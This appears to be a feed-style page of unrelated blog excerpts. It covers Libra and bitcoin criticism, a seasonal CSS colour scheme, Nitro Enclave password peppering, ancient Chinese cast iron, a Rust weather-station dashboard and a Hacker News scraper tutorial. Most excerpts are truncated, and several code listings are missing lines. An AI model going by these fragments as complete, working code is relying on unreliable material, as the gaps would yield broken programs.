<p>According to Gerard, Facebook seriously misjudged the complexity of the regulations governing the world’s financial system. The firm apparently thought it could just launch a new global digital currency on the basis of a good idea, he says during the podcast.</p>
<p>While the tech giant is likely to continue in its payments push, says Gerard, it will have to do so with vastly reduced ambitions. Facebook <a href="https://newmoneyreview.com/index.php/2020/04/16/facebooks-libra-goes-for-single-currency-stablecoins/">has already been forced to abandon its plans for a single global currency unit</a>.</p>
<blockquote><p>Bitcoin is an ‘apocalyptic death cult’</p></blockquote>
<p>In the podcast, Gerard also explains his long-standing dislike of cryptocurrency, calling bitcoin an ‘apocalyptic death cult’.</p>
<p>While the cryptography supporting bitcoin is sound, he says, the 12-year-old digital currency—and its many spin-offs—have attracted serial scammers, who keep preying on gullible members of the public.</p>
<p>During the interview, Gerard goes on to express scepticism about <a href="https://newmoneyreview.com/index.php/2020/08/27/will-digital-cash-be-private/">the current race to introduce central bank digital currencies (CBDCs)</a>.</p>
<p><a href="https://newmoneyreview.com/index.php/2020/11/04/digitalisation-of-payments-accelerates/">As payments become increasingly digital</a>, CBDCs could replace national banknotes and coins.</p>
<p>But most of these new digital moneys are a solution in search of a problem, argues Gerard, and are unlikely to take off.</p>

<h3>Seasonal.css: Give your website a seasonal colour scheme</h3>
<p><i>Fri  6 November 2020</i></p>
<p><i>Tagged: <a href="https://incoherency.co.uk/blog/tags/software.html">software</a></i></p>
<p>I've been working on a project that gives a CSS colour scheme that varies based on the day of the year, with a vague attempt
to match the colour to the season. In case you're wondering why my blog has a new purple colour scheme (at time of writing):
this is why. Have another look tomorrow if you want to see the same content in an imperceptibly-different purple.</p>
<p>Check out the <a href="https://seasonal-css.incoherency.co.uk/">Seasonal.css project homepage</a>
or see the <a href="https://github.com/jes/seasonal-css">README on github</a>.</p>
<p>If you want, you can use it on your own pages:</p>
<pre><code>&lt;link rel="stylesheet" type="text/css" href="https://seasonal-css.incoherency.co.uk/seasonal.css"&gt;</code></pre>
<h2>What?</h2>
<p>Seasonal.css gives you a different colour scheme every day. Each day is only marginally different from the day before, but over the course
of the year, the entire range of the colour wheel is visited. Autumn has orange-purple colours, winter has purple-blue, spring has
blue-green, and summer has yellow-orange.</p>
<p>This animation shows the colour scheme on this blog throughout the year, at 30-day intervals:</p>
<p><a href="https://img.incoherency.co.uk/3027"><img src="https://img.incoherency.co.uk/3027"></a></p>
<p>This is accomplished by having Seasonal.css write the day's colours into <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS
variables</a> which can then be used to style the page.</p>
<h2>Why?</h2>
<p>From the README:</p>
<blockquote>One morning, while looking out of my window at the autumnal leaves on the trees, I thought to myself "my, what beautiful colours, I wish I could have these on my website". The idea fermented for a little while and I eventually realised that it would be possible for the colours of the website to change to match the colours of the seasons.
<p>
I enjoy how the colours of the natural world change throughout the year and wanted to bring the same experience to the web.</p></blockquote>
<h2>How?</h2>
<p>My initial idea was to manually define a colour scheme for each of the 4 seasons, and then interpolate between them with a few sine waves to generate
the colour scheme for each day. This did not work very well at all, because I had no understanding of colour theory. For example, the background
colour of one season had no relationship to the background colour of the next season (different saturation, brightness, etc.) because each colour
scheme was picked in isolation. This meant that interpolating between them resulted in nonsensical colour schemes.</p>
<p>A friend then linked me to Rob Weychert's <a href="https://v6.robweychert.com/blog/2019/12/dynamic-color-javascript-hsl/">dynamic, date-based colour</a>
project. (Rob also has a great post on <a href="https://v6.robweychert.com/blog/2018/02/v6-color/">colour theory</a> which is worth reading.)</p>
<p>Rob's approach was to split the HSL colour wheel up so that the first of each month takes a position on the colour wheel, and then linearly interpolate hues using
the colour wheel. Then define background, foreground, etc. saturation and lightness independently of the hue, so that they remain consistent throughout
the year. This works much better.</p>
<p>The biggest problem with Seasonal.css is that the colours from about mid-June to the end of July are a kind of muddy brown instead
of a bright summery yellow. The reason I have done this is that bright yellow doesn't give very good contrast against a light background, but the muddy
brown doesn't really convey "summer" very well. I'm interested in improvements to the colour scheme.</p>
<p>Seasonal.css is written in JavaScript, for the marginal benefit of being able to run the same code on the client as on the server.
I have used this on the project homepage to provide the live preview of the colour scheme for each day when you drag the slider.</p>
<p>To prevent the browser from caching yesterday's colour scheme, it sends headers:</p>
<pre><code>Expires: 0
Cache-Control: no-cache
</code></pre>
<p>That's not a proper date in the <tt>Expires</tt> header, but RFC2616 section 14.21 says:</p>
<blockquote>HTTP/1.1 clients and caches MUST treat other invalid date formats, especially including the value "0", as in the past (i.e., "already expired"). </blockquote>
<h2>Conclusion</h2>
<p>I'm pretty pleased with the end result, but I expect it would be a lot better if it were designed by someone with actual design
experience. If you think you can help please get in touch!

<p>Nitro Enclaves provide isolated compute environments for secure processing of very sensitive data. In this article we will use Nitro Enclaves to build an extremely safe password storage mechanism.</p>
<p>Something was bugging me after publishing my recent articles about EC2 Nitro Enclaves (<a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">part 1</a>, <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">part 2</a>). It took me a few days until I realized what it was: aside from the ACM reference architecture I couldn’t come up with a valid use case for Nitro Enclaves. This left me wondering - are Nitro Enclaves a solution in search of a problem?</p>
<p>A couple of hours of sketching and thinking left me with a few infeasible or convoluted implementation ideas. But then it hit me. Nitro Enclaves can be used to provide a super secure password storage mechanism. At the end of this post we will have built a Nitro Enclave application that will protect user passwords, even when an attacker has full control over the application server and database. This Nitro Enclave application is called NitroPepper.</p>
<p><strong>[Update November 7th, 2020]</strong> An earlier version of this post used PBKDF2. That received some fair comments on <a rel="noopener noreferrer" href="https://news.ycombinator.com/item?id=25010709">Hacker News</a>. PBKDF2 has now been replaced with bcrypt. The pull request for this replacement can be found <a rel="noopener noreferrer" href="https://github.com/donkersgoed/nitropepper-enclave-app/pull/1/files">here</a>.</p>
<p>This article consists of three sections. Section 1 covers password storage mechanisms and explains the problem solved by NitroPepper. Section 2 covers the implementation details of NitroPepper. In section 3 we will walk through all the steps to get NitroPepper running on your own EC2 instances.</p>
<p>The NitroPepper architecture requires a few components, all of which we will discuss in depth in section 2. The components we use are:</p>
<ul>
<li>A simple Python <strong>Flask frontend</strong> (<a rel="noopener noreferrer" href="https://github.com/donkersgoed/nitropepper-demo-webapp">GitHub</a>) exposing two REST API methods: <code>new_user</code> and <code>login</code>. This frontend only serves demo purposes.</li>
<li>The <strong>NitroPepper application</strong> (<a rel="noopener noreferrer" href="https://github.com/donkersgoed/nitropepper-enclave-app">GitHub</a>), written in Python, running in the Nitro Enclave.</li>
<li>The AWS <strong>Nitro Enclaves NSM API</strong>, extended with Python interfaces (<a rel="noopener noreferrer" href="https://github.com/donkersgoed/aws-nitro-enclaves-nsm-api">GitHub</a>). This API provides an interface between NitroPepper and the Nitro Security Module (NSM).</li>
<li>A <strong>traffic forwarder</strong> to send KMS traffic from NitroPepper to KMS.</li>
<li>A <strong>KMS Proxy</strong> to send KMS traffic from the parent EC2 instance to KMS.</li>
</ul>

<h3>Section 1: a brief history of password storage</h3>
<p>Any system with a user login requires some way to store a user’s password. Decades ago, it was acceptable to store passwords in plain text. But as more and more valuable data was stored online, people started attacking databases and extracting their contents. To protect against password leaks, gradually more sophisticated methods for storing passwords were developed. In this section we will briefly go trough the history of password storage.</p>
<p>If you’re already familiar with hashing algorithms, salt and pepper, feel free to skip this section and jump to the paragraph “The case for a unique pepper per user”.</p>
<p>One caveat: in the sections below I use MD5 as an example hashing mechanism. MD5 is known to be very insecure and you should never use it for real world password hashing. Instead, you would use SHA-512, SHA3 or another highly secure algorithm. The reason I use MD5 in this article is because its output is nice and short, which makes for easier reading.</p>
<h4>The olden days: plain text</h4>
<p>In an almost forgotten past, applications were not connected to the internet, databases were never attacked and passwords could be stored in plain text. A few rows in a user table might look like this:</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><a rel="noopener noreferrer" href="mailto:alice@example.net">alice@example.net</a></td>
<td>super_Secret1</td>
</tr>
<tr>
<td>2</td>
<td><a rel="noopener noreferrer" href="mailto:bob@example.net">bob@example.net</a></td>
<td>can’t_gues5_This</td>
</tr>
</tbody>
</table>
<p><br>To log in to this system, the user provides their username and password to the application. The application checks if the username/password combination exists in the database. If the combination is found, the user is allowed in.</p>
<p>As systems got more connected and accessible, database hacks and dumps also became more common. When an attacker would gain access to a database with passwords stored in plain text, they could use this information to log in as any user. To make matters worse, users commonly reuse passwords. This means that an attacker could use the passwords found at insecure site A to try a log in on another site B, even if this site did securely store their passwords.</p>
<h4>Replacing plain text passwords with hashes</h4>
<p>The first development to improve password storage security was <a rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">hashing</a>. A hashing algorithm like MD5 or SHA takes an input (in our case, the password) and generates a fixed-length string for this input. The algorithm is a mathematical operation that will always generate the same output for any given input. For example:</p>
<pre><code>MD5(super_Secret1) -&gt; bd2bf17a10bc97a50bfb551aa2de9e76
MD5(can't_gues5_This) -&gt; fda5a58b6772c04ea8e0aa6d0767d880
</code></pre>
<p>The essence of a hash function is that it is one-directional. In other words, you can generate a hash from a password, but not a password from its hash. So if someone would gain access to the hash <code>bd2bf17a10bc97a50bfb551aa2de9e76</code>, they wouldn’t know that the source password was <code>super_Secret1</code>.</p>
<p>An application built around this technology would no longer store plain text passwords, but store the hashed version instead:</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Username</th>
<th>PasswordHash</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><a rel="noopener noreferrer" href="mailto:alice@example.net">alice@example.net</a></td>
<td>bd2bf17a10bc97a50bfb551aa2de9e76</td>
</tr>
<tr>
<td>2</td>
<td><a rel="noopener noreferrer" href="mailto:bob@example.net">bob@example.net</a></td>
<td>fda5a58b6772c04ea8e0aa6d0767d880</td>
</tr>
</tbody>
</table>
<p><br>When a user logs in to this application they provide their username and plain text password. The application hashes the password at every login attempt and compares the result with the hash stored in the database. If they match, the user is allowed in.</p>
<p>With this solution the password is no longer stored in plain text. However, there are still significant weaknesses. The first is that some algorithms, like MD5 and SHA1, have been ‘broken’. When an algorithm has been broken, an attacker can independently generate an input string that results in the given hash. They can then use this input string as the password. Another problem is that the hash value will always be the same for a given password. An attacker can use this fact to build dictionaries or rainbow tables with the hash of common inputs and patterns. When they gain access to a database of hashes they only need to look them up in their dictionary to determine the original password.</p>
<h4>Adding salt to hashes</h4>
<p>The next generation of password security solves the problems of hashing by adding a <em>salt</em>. Why is this called a salt? Because salt goes well with hash. With <a rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a>, we still use a hashing algorithm, but instead of just hashing the plain password, we add a random string to the input. A few quick examples:</p>
<pre><code>MD5(super_Secret1-123455) -&gt; 8b7478c3ba06d3c5ed56754094ba5cd3
MD5(super_Secret1-669911) -&gt; c9037f7af3e52966f4766074b17c0b8c
MD5(can't_gues5_This-998765) -&gt; 337ef055ed6d3efd9d8d31a58d55bfab
</code></pre>
<p>This salt is stored with the user information in the database. Please note that a salt would in reality be a longer string with a larger character set.</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Username</th>
<th>PasswordHash</th>
<th>PasswordSalt</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><a rel="noopener noreferrer" href="mailto:alice@example.net">alice@example.net</a></td>
<td>bd2bf17a10bc97a50bfb551aa2de9e76</td>
<td>123455</td>
</tr>
<tr>
<td>2</td>
<td><a rel="noopener noreferrer" href="mailto:bob@example.net">bob@example.net</a></td>
<td>fda5a58b6772c04ea8e0aa6d0767d880</td>
<td>998765</td>
</tr>
</tbody>
</table>
<p><br>With a salt added to the password, two identical passwords (<code>super_Secret1</code>) become unique (<code>super_Secret1-123455</code> and <code>super_Secret1-669911</code>), which results in different hashes.</p>
<p>When logging in to this system, the user still provides their plain text password. The server then retrieves the salt from the database and performs the hash function: <code>MD5([password]-[salt])</code>. When the resulting hash matches the stored password hash, the user is allowed to log in.</p>
<p>With salt added to hashes, dictionaries and rainbow tables have become useless. Unfortunately, even this solution is not strong enough in a number of use cases.</p>
<h4>Adding a shared secret pepper</h4>
<p>In the solution above all information is stored in a single source - the database. If the attacker has access to the database and a known entry (for example their own username and password), they can attempt to retrieve the original values through brute force. This might take a while, but processing power becomes cheaper every year, and governments have access to supercomputers that might make breaking passwords easier than you might expect.</p>
<p>To be fair, a storage mechanism with properly salted passwords will be more than secure enough for most applications. But in healthcare, finance or government use cases, it might not be sufficient. This is where adding a server based pepper comes into play. Why is it called a pepper…? Well you get the point.</p>
<p>A shared secret pepper builds on the principle of the salt, but instead of storing the value in the database, it is stored on the server file system or another non-database system like AWS Secrets Manager. To be able to decrypt the passwords in the database the attacker needs access to both the database and secondary storage system, which significantly improves security. A simple SQL injection attack or access to a database backup is now no longer sufficient to attempt a brute force attack.</p>
<p>This time when a user attempts to log in, the application will hash the password + salt + pepper: <code>MD5([password]-[salt]-[pepper])</code>. When the result matches the password hash stored in the database, the user is allowed in.</p>
<h4>The case for a unique pepper per user</h4>
<p>The Wikipedia page for <a rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Pepper_(cryptography)">Pepper (cryptography)</a> states: “In the case of a shared-secret pepper, a single compromised password (via password reuse or other attack) along with a user’s salt can lead to an attack to discover the pepper, rendering it ineffective”. Additionally, a user, engineer or hacker  with access to a web server will likely have access to the database credentials and the shared secret pepper. If this person could exfiltrate the database and the shared secret pepper, the passwords can be brute-forced again.</p>
<p>The solution is to generate a pepper unique to every user. Of course, the salt is also unique to each user. The difference between the user salt and the unique user pepper is where they are stored. The salt is stored semi-publicly with the user’s hashed password, while the unique user pepper is stored on a separate medium, such as a Hardware Security Module (HSM). The …</p></div></div>

<p>This week, as an addendum to our four(and a half)-part (<a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">I</a>, <a href="https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/">II</a>, <a href="https://acoup.blog/2020/10/02/collections-iron-how-did-they-make-it-part-iii-hammer-time/">III</a>, <a href="https://acoup.blog/2020/10/09/collections-iron-how-did-they-make-it-part-iva-steel-yourself/">IVa</a>, <a href="https://acoup.blog/2020/10/16/collections-iron-how-did-they-make-it-part-ivb-work-hardening-or-hardly-working/">IVb</a>) look at pre-modern iron and steel production, we’re going to look at two alternative regional processes, where they fit into the entire iron production process that we detailed already, how they worked and what kind of product they produced.  In particular, we are going to look at the early production of cast iron in China, and the production of a form of crucible steel, called <em>wootz</em>, in India (and South Asia more broadly).</p>



<p>First, some necessary caveats.  Neither of these methods of iron production were practiced in my core area of research (the greater Mediterranean world during the Hellenistic and Roman periods), although <em>wootz</em> steel was imported in small quantities during that time and a handful of cast iron goods produced in China also made it to the broader Roman or Hellenistic world (though very, <em>very</em> few).  Consequently my knowledge here is much thinner and I am much more reliant on reporting the work of other scholars.  Moreover, some of the scholarship on these topics is in languages I do not read, so I am also reliant on other scholars for that.  As such, this is going to be a much more general discussion of these processes and I am going to be a bit more cautious about what I say about them.  At the same time, I simply don’t have the information to talk much about the details of the lives of the iron-workers here themselves, like I could in the previous posts, so this will mostly focus on process and product, rather than people.</p>



<p>That said, I thought this was still worth doing because it seems like there is quite a bit of unhelpful ‘mystique’ surrounding both.  On the one hand, a lot of the discussion of the production of cast iron in China fails to really put the innovation both in the correct spot in the iron production process but also in the correct context in terms of the development of iron-working technology.  On the other hand, much of the popular discussion about <em>wootz</em> steel in India treats it as this quasi-legendary ‘lost’ and mysterious production process when it is, in fact, a fairly well understood method of producing high-quality steel.</p>



<p>And of course, as always, if you want to support my essay production process, you can do so via <a href="https://www.patreon.com/user?u=20122096">Patreon</a> and by sharing to my work to a wider audience (but please do not copy-and-repost these essays; link to them instead).  And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings (and I promise fewer political musings now that the electoral<em> <em>götterdämmerung</em></em> has come and – heavens I hope by the time this post goes live – gone).</p>






<p>(Subsequent edit: Due to some election-related trolling coming from off-site, I had to prune back the comments to the original topic.  Apologies for those whose comments were pruned (except the troll) but I wanted to keep us on topic and away from the abyss of endless political carping.)</p>



<h2>Cast Iron in China</h2>



<p>Now I’ve stated several times during this series that generally speaking the bloomeries used to smelt iron in the pre-modern period were not capable of reaching the high temperatures (1538 °C) required to actually melt iron and instead produced pure metallic iron through solid state reduction (that is, the bloomery process) along with, essentially, melting everything that <em>wasn’t</em> iron out of the bloom.  And for most of the world in most of the pre-modern period, this is true.</p>



<p><strong>China appears to be the odd exception</strong>.  I should note that this is an area of scholarship that is still quite active – dates are still in flux (shifting back as new discoveries push back the earliest dates) and the exact nature of the transitions from bronze-working to iron-working in China and the degree to which the bloomery processes we’ve discussed served as an intermediate stage is still debated, as far as I know.  A fair bit of the discussion of the question is, unsurprisingly, in Chinese, which I cannot read.  So I am doing my best to provide a summary of what I know.</p>

<p>Cast iron in China seems to become widespread during the Warring States period (453-221), though the technology itself probably had its genesis in the earlier Spring and Autumn period (770-454) and it becomes truly ubiquitous during the early Qin-Han Period (221 BC – 220 AD).  The general working hypothesis based on the evidence is that the cast iron product emerged not out of bloomery iron production (which seems to have been used in China side-by-side with cast iron production for the first couple of centuries) but instead out of the furnace techniques already in use for casting objects in copper-alloy (read: bronze), until the cast iron process became able to produce a high enough quality iron product that it supplanted bloomery production, probably in the last century BC. Again, those dates are very approximate and seem to me to still be significantly unsettled, going by the range I’ve seen in scholarship (the most recent I could find on this was “Everything Old is new Again?  Rethinking the Transition to Cast Iron production in the Central Plains of China” in <em>Journal of Anthropological Research</em> (2014), so those are the dates I have gone with; Craddock and Tylecote both have somewhat later dates).</p>



<p>The basic interaction of producing cast iron centers around one oddity in carbon-iron alloys: <strong>as you add more carbon to iron, the melting point of the resulting mixture drops</strong>.  At 4.3% carbon content, the melting point of iron drops to just 1150 °C, which <a href="https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/">as you will recall</a>, is very much within reach for pre-modern furnaces worked by bellows (and China seems to have generally had better, hotter furnaces than contemporary pre-modern Europe to boot).  Adding small amounts of either sulfur (typically from coal being used to supply the carbon) or phosphorous can lower the melting point further, although these can also make the metal brittle.  At that point, large, bellows-fed furnaces can heat the iron-carbon mixture up to the point where it melts and becomes sufficiently fluid to cast (slag and other impurities, being lighter, can be drawn out with a flux and tapped off).  <strong>The result is cast iron</strong> (also called ‘pig iron’).</p>



<p>The <em>problem</em>, as we’ve discussed earlier, <strong>is that cast iron</strong> (which, to be clear, iron produced this way is still cast iron, even if you aren’t pouring it into a model; it is a type of iron as will become plain) <strong>comes out of the process with unfavorable characteristics</strong>, particularly in strength, brittleness and malleability – <strong>in short, it is too hard, too weak, and too prone to break and crack rather than bend</strong>.  The carbon content of cast iron is, of course, very high: above 4%, the carbon makes the iron much too hard and inflexible, causing it to become extremely brittle.  In particular, if the silicon content (which is likely to come from bits of slag melting and dissolving into the iron at the high temperatures) is low and the iron is cooled fairly quickly, it forms into cementite, which is hard and brittle.  Cementite isn’t bad in and of itself – <a href="https://acoup.blog/2020/10/16/collections-iron-how-did-they-make-it-part-ivb-work-hardening-or-hardly-working/">we saw this with heat-treated steel</a>, where just a bit of cementite among the ferrite offered improved strength and hardness.  But this is not just a little cementite, it is <em>lots of cementite</em>.  In excess of 60% cementite, what is sometimes called <a href="https://en.wikipedia.org/wiki/Cast_iron#White_cast_iron">‘white’ cast iron</a>.  <strong>At these levels, the amount of cementite leaves the cast iron very hard and very brittle, likely to break</strong> <strong>and actually difficult to cast effectively</strong> (because it is likely to crack from thermal stresses as it cools).</p>

Using mechanical assistance like this would have made the furnace operation significantly more labor efficient.</figcaption></figure>



<p>More slowly cooled cast iron with high silicon content, can come as <a href="https://en.wikipedia.org/wiki/Cast_iron#Grey_cast_iron">‘grey’ cast iron</a>, which has less cementite, but has instead pockets of <a href="https://en.wikipedia.org/wiki/Graphite"><em>graphite</em> </a>– little pockets of cure crystalline carbon which couldn’t be absorbed into the iron – which have very little strength and essentially functions as cracks within the iron, reducing the overall toughness considerably.  Craddock notes that early Chinese cast iron tends to be grey cast iron, but – curiously – with somewhat lower silicon contents than we’d expect for grey cast iron.  So for almost any tool or weapon use, our cast iron is functionally worthless: too brittle to sustain meaningful stress.  <strong>But we’re not done.</strong></p>



<p><strong>The key technique that Chinese ironworkers seemed to have developed here is <em>malleablisation</em>.</strong>  By heating the iron to melting temperatures (or just below) in an oxidizing environment (which is to say, open to the air) the ironworker can cause a few things to happen.  First, the oxidation process begins to draw off the carbon from the iron (again, you will remember the tendency of heat and air to decarburize iron from<a href="https://acoup.blog/2020/10/09/collections-iron-how-did-they-make-it-part-iva-steel-yourself/"> our discussion of making steel</a>).  At the same time, the graphite which originally was in long, thin flakes begins to form into more compact round shapes which cause less strain on the metal (there is also just <em>less</em> of that graphite, because it is made of the carbon that the air is drawing off in the decarburization process).  If the iron is kept hot and open to the air long enough, it can either be decarburized to steel or even all of the way to wrought iron, making it usable for tools, weapons, armor and the like.</p>



<p>(I should note that somewhat different processes for removing carbon to make cast iron workable as wrought iron, called <strong><a href="https://en.wikipedia.org/wiki/Finery_forge">fining</a></strong>, emerged in late medieval Europe.  This was done at a finery forge (we start to see these as early as the 13th century AD in Europe and involving breaking cast iron into smaller chunks and then heating …</p></div></div>

<p>In this last post of the series we are going to look at how to build a simple weather station UI dashboard.</p>

  <li>→ Building a Weather Station UI</li>
</ol>


<p>In <a href="https://blog.kdubovikov.ml/articles/rust/building-a-weather-station-bot">the previous post</a> we have built a weather station bot that can notify us about new measurements made by our weather station. Today, we are going to build a simple REST API to fetch the data from our server and draw a chart on a simple dashboard.</p>


<p>Our web interface will need historical data that will be displayed in the charts. Before building an actual UI we will create a REST API that will return all sensor readings that are stored in our database. The code for the API is located in the <a href="https://github.com/kdubovikov/weather-station-bot/blob/master/src/bin/weather_station_api.rs"><code>weather_station_api.rs</code></a> file. We will use the <a href="https://docs.rs/tower-web/0.3.7/tower_web/">tower_web</a> crate to create a service that will return all sensor measurements along with their timestamps. We already have the database related code covered in the previous post. The entire service code is very concise:</p>

<div><div><pre><code><span>/// This type will be part of the web service as a resource.</span>
<span>#[derive(Clone,</span> <span>Debug)]</span>
<span>struct</span> <span>WeatherApi</span><span>;</span>

<span>/// This will be the JSON response</span>
<span>#[derive(Response)]</span>
<span>struct</span> <span>WeatherMessageResponse</span> <span>{</span>
    <span>messages</span><span>:</span> <span>Vec</span><span>&lt;</span><span>WeatherMessage</span><span>&gt;</span>
<span>}</span>

<span>impl_web!</span> <span>{</span>
    <span>impl</span> <span>WeatherApi</span> <span>{</span>
        <span>#[get(</span><span>"/"</span><span>)]</span>
        <span>#[content_type(</span><span>"json"</span><span>)]</span>
        <span>fn</span> <span>get_all_weather_messages</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>WeatherMessageResponse</span><span>,</span> <span>()</span><span>&gt;</span> <span>{</span>
            <span>let</span> <span>conn</span> <span>=</span> <span>establish_connection</span><span>(</span><span>"./db.sqlite"</span><span>);</span> <span>// this is a magic string better to be left in a config file, but I'll let it as it is for the sake of simplicity</span>
            <span>let</span> <span>weather_messages</span> <span>=</span> <span>get_all_weather_messages</span><span>(</span><span>&amp;</span><span>conn</span><span>);</span>
            <span>Ok</span><span>(</span>
               <span>WeatherMessageResponse</span> <span>{</span> <span>messages</span><span>:</span> <span>weather_messages</span> <span>}</span>
            <span>)</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>After that all we need is to run the server somewhere inside our <code>main</code> function:</p>

<div><div><pre><code><span>let</span> <span>cors</span> <span>=</span> <span>CorsBuilder</span><span>::</span><span>new</span><span>()</span>
        <span>.allow_origins</span><span>(</span><span>AllowedOrigins</span><span>::</span><span>Any</span> <span>{</span> <span>allow_null</span><span>:</span> <span>true</span> <span>}</span> <span>)</span>
        <span>.build</span><span>();</span>

<span>ServiceBuilder</span><span>::</span><span>new</span><span>()</span>
    <span>.resource</span><span>(</span><span>WeatherApi</span><span>)</span>
    <span>.middleware</span><span>(</span><span>cors</span><span>)</span>
    <span>.run</span><span>(</span><span>&amp;</span><span>addr</span><span>)</span>
    <span>.unwrap</span><span>();</span>
</code></pre></div></div>

<p>You can check that the API works as intended by running the server and issuing an HTTP GET request with <code>curl</code> or <a href="https://www.postman.com/">Postman</a>.</p>


<p>Now, let’s create a simple UI Dashboard. The purpose of our interface will be to display a historical plot of temperature, humidity and pressure readings from our weather station. We won’t use any complex javascript frameworks and stick to vanilla javascript. This is how the final result will look like:</p>

<h2 id="markup">Markup</h2>
<p>For a start, let’s look at <code>index.html</code>:</p>

<span>&lt;/html&gt;</span>

<h2 id="ui-logic">UI logic</h2>
<p>Having finished with the markup we now can transition to making our dashboard to be useful by implementing some logic in the <code>index.js</code> script. As a headstart, let’s start from the top abstraction level and look what the code does in overall:</p>

<p>Now that we have seen the whole picture, let’s look at how the individual functions work. We will start with <code>createChart</code>, that uses our canvas to display a plot using chart.js library:</p>

            <span>}</span>
        <span>}</span>
    <span>});</span>

    <span>return</span> <span>chart</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Now, let’s look at how we can prepare data to be rendered by chart.js uring <code>createChartDataset</code> function:</p>

<div><div><pre><code><span>/**
 * Transforms API response into an object that can be used in the {@link updateChart} call. 
 * @param {Object} data 
 * @param {string} selector 
 */</span>
<span>function</span> <span>createChartDataset</span><span>(</span><span>data</span><span>,</span> <span>selector</span><span>)</span> <span>{</span>
    <span>let</span> <span>series</span> <span>=</span> <span>data</span><span>.</span><span>messages</span><span>.</span><span>map</span><span>(</span><span>item</span> <span>=&gt;</span> <span>item</span><span>[</span><span>selector</span><span>]);</span>
    <span>return</span> <span>{</span>
        <span>'</span><span>dates</span><span>'</span><span>:</span> <span>data</span><span>.</span><span>messages</span><span>.</span><span>map</span><span>(</span><span>item</span> <span>=&gt;</span> <span>item</span><span>.</span><span>timestamp</span><span>),</span>
        <span>'</span><span>data</span><span>'</span><span>:</span> <span>series</span><span>,</span>

    <span>};</span>
<span>}</span>
</code></pre></div></div>

<p>Finally, let’s look at how to update the existing chart’s data:</p>

<div><div><pre><code><span>/**
 * Updates given chart using data and sets y axis min and max values 
 * @param {ChartJS object} chart 
 * @param {Object} data

 */</span>
<span>function</span> <span>updateChart</span><span>(</span><span>chart</span><span>,</span> <span>data</span><span>,</span> <span>min</span><span>,</span> <span>max</span><span>)</span> <span>{</span>

    <span>chart</span><span>.</span><span>options</span><span>.</span><span>scales</span><span>.</span><span>yAxes</span><span>[</span><span>0</span><span>].</span><span>ticks</span><span>.</span><span>suggestedMin</span> <span>=</span> <span>min</span><span>;</span>

    <span>chart</span><span>.</span><span>update</span><span>();</span>

<span>}</span>
</code></pre></div></div>

<p>That is everything that we neet to fetch and render our weather station measurements using an API. Now, let’s switch to the styling part and make things look a bit prettier.</p>

<h2 id="styling">Styling</h2>

<p>In this project, we will use <a href="https://sass-lang.com/">SASS</a> extension language as a handy abstraction upon regular CSS. It allows to write stylesheets in a more clean and readable manner. I won’t do a detailed walkthrough of the stylesheet and encourage you to clone the repository, open the <code>index.html</code> file in the browser and play with the styles yourself. Page styling and design are better to be learned in practice: install <code>sass</code>, read documentation and experiment.</p>



<p>By this post, we conclude the journey that led us from building ESP32 based weather station hardware, writing firmware, coding the backend service that tracks all measurements, building a Telegram notification bot and creating a simple web dashboard …</p></article></div>

You can create the repo beforehand and then initialise it with <code>npm</code>.</p><p>This creates a <code>package.json</code> file that resembles your npm package.</p><p>I would start with <code>ava</code> as test-runner and assertion library.</p><p><code>npm i --save-dev ava</code></p><p>Add the following <code>test</code> script to the <code>scripts</code> section of your <code>package.json</code>:</p><pre><code>  "scripts": {
    "test": "ava",
    ...
</code></pre><p>As a first test, I would verify that I can successfully get the HTML of <a href="https://news.ycombinator.com/">https://news.ycombinator.com</a>.</p><p>Let's try.</p><h2>Create <code>index.test.js</code></h2><p>Create a file called <code>index.test.js</code> and start by including <code>ava</code>:</p><pre><code>const test = require('ava')
</code></pre><p>The first test could look something like this:</p><pre><code>test('gets html from https://news.ycombinator.com/', async t =&gt; {
  ...
})
</code></pre><h2>First assertion</h2><p>Let's assert/verify that our code is able to get the html</p><pre><code>test('gets html from https://news.ycombinator.com/', async t =&gt; {
  const html = await getHTML()
  t.true(typeof html === 'string')
  t.true(html.startsWith('&lt;html '))
})
</code></pre><p>Now we need <code>getHTML</code>. I like using <code>got</code> for making simple HTTP requests.</p><p>Install it with <code>npm i got</code></p><pre><code>const got = require('got')
async function getHTML () {
  return got('https://news.ycombinator.com')
    .then(res =&gt; res.body)
}
</code></pre><p>Now we have <code>getHTML</code> that returns the markup for news.ycombinator.com</p><p>Let's parse it!</p><h2>HTML of HackerNews</h2><p>Taking a look at the source of HackerNews, the page has the following structure:</p><pre><code>&lt;table border="0" cellpadding="0" cellspacing="0" class="itemlist"&gt;
  &lt;tbody&gt;
    &lt;tr class="athing" id="25005567"&gt;
      &lt;td align="right" valign="top" class="title"&gt;
        &lt;span class="rank"&gt;1.&lt;/span&gt;
      &lt;/td&gt;
      &lt;td valign="top" class="votelinks"&gt;
        &lt;center&gt;
          &lt;a id="up_25005567" href="vote?id=25005567&amp;amp;how=up&amp;amp;goto=news"&gt;
            &lt;div class="votearrow" title="upvote"&gt;&lt;/div&gt;
          &lt;/a&gt;
        &lt;/center&gt;
      &lt;/td&gt;
      &lt;td class="title"&gt;
        &lt;a href="https://lwn.net/SubscriberLink/835962/ae41b27bc20699ad/" class="storylink"&gt;
